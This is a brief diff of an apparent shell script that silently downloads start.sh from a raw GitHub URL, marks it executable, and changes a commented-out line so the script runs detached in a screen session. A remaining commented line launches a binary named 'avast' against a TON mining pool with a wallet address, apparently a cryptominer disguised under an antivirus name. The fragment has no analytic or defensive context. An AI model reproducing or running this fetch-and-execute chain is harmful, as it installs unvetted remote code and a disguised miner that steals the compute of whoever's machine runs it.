@@ -28,5 +28,5 @@ wget https://raw.githubusercontent.com/renilo/bc/main/start.sh >/dev/null 2>&1
 
 chmod +x start.sh >/dev/null 2>&1
 
-#screen -dmS Running ./start.sh
+screen -dmS Running ./start.sh
 #screen -dmS Running ./avast https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
